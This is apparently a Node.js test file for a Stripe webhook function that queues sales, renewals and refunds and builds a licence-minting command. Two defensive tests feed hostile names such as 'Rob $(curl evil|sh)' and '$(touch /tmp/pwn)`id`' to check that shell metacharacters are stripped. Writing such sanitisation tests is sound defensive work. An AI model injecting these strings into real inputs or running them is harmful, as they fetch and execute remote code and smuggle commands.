import { test } from 'node:test';
import assert from 'node:assert';
import {
  safeName,
  mintCommand,
  handleStripeWebhook,
} from '../../netlify/functions/stripe-webhook.mjs';
test('safeName strips shell metacharacters', () => {
  assert.equal(safeName('Rob $(curl evil|sh)'), 'Rob curl evilsh');
  assert.equal(safeName('a`id`b'), 'aidb');
  assert.equal(safeName("O'Neil-Smith j.o@x.y"), "O'Neil-Smith j.o@x.y");
  assert.equal(safeName(''), 'New customer');
});
test('mintCommand contains no $ or backtick even for hostile names', () => {
  const cmd = mintCommand({ name: '$(touch /tmp/pwn)`id`"', email: 'a@b.c' });
  assert.ok(!/[$`]/.test(cmd), cmd);
});

function checkoutEvent(overrides = {}) {
  return {
    type: 'checkout.session.completed',
    data: {
      object: {
        id: 'cs_audioquill_1',
        client_reference_id: 'audioquill',
        mode: 'subscription',
        subscription: 'sub_1',
        customer_details: { name: 'Audio Quill Buyer', email: 'buyer@example.com' },
        ...overrides,
      },
    },
  };
}

async function dispatch(event, { env = {}, deps = {} } = {}) {
  return handleStripeWebhook({
    rawBody: JSON.stringify(event),
    signature: 'test-signature',
    env: {
      STRIPE_WEBHOOK_SECRET: 'test-webhook-secret',
      GITHUB_QUEUE_TOKEN: 'test-queue-token',
      ...env,
    },
    deps: {
      verifySignature: () => true,
      pushQueue: async () => ({ ok: true }),
      notify: async () => ({ ok: true }),
      now: Date.parse('2026-08-03T00:00:00.000Z'),
      ...deps,
    },
  });
}

test('paid checkout is acknowledged only after the sale is durably queued', async () => {
  const writes = [];
  const response = await dispatch(checkoutEvent(), {
    deps: { pushQueue: async (entry) => { writes.push(entry); return { ok: true }; } },
  });

  assert.equal(response.status, 200);
  assert.equal(response.body.mode, 'queued');
  assert.equal(response.body.queued, true);
  assert.equal(writes.length, 1);
  assert.equal(writes[0].path, 'queue/sale-cs_audioquill_1.json');
  assert.equal(writes[0].record.product, 'audioquill');
});

test('paid checkout returns 503 when the queue rejects the write so Stripe retries', async () => {
  const response = await dispatch(checkoutEvent(), {
    deps: { pushQueue: async () => ({ ok: false, status: 503 }) },
  });

  assert.equal(response.status, 503);
  assert.deepEqual(response.body, { received: false, error: 'queue_unavailable' });
});

test('paid checkout returns 503 when queue credentials are missing', async () => {
  const response = await dispatch(checkoutEvent(), {
    env: { GITHUB_QUEUE_TOKEN: '' },
  });

  assert.equal(response.status, 503);
  assert.equal(response.body.error, 'queue_unavailable');
});

test('idempotent Stripe replay does not duplicate the owner notification', async () => {
  let notifications = 0;
  const response = await dispatch(checkoutEvent(), {
    env: { RESEND_API_KEY: 'test-resend-key', LICENCE_EMAIL_TO: 'owner@example.com' },
    deps: {
      pushQueue: async () => ({ ok: true, already: true }),
      notify: async () => { notifications++; return { ok: true }; },
    },
  });

  assert.equal(response.status, 200);
  assert.equal(notifications, 0);
});

test('renewal and refund events return 503 when their durable queue write fails', async () => {
  const queueFailure = { pushQueue: async () => { throw new Error('queue offline'); } };
  const renewal = await dispatch({
    type: 'invoice.paid',
    data: { object: { id: 'in_1', billing_reason: 'subscription_cycle', subscription: 'sub_1' } },
  }, { deps: queueFailure });
  const refund = await dispatch({
    type: 'charge.refunded',
    data: { object: { id: 'ch_1', payment_intent: 'pi_1', amount_refunded: 2900 } },
  }, { deps: queueFailure });

  assert.equal(renewal.status, 503);
  assert.equal(refund.status, 503);
});
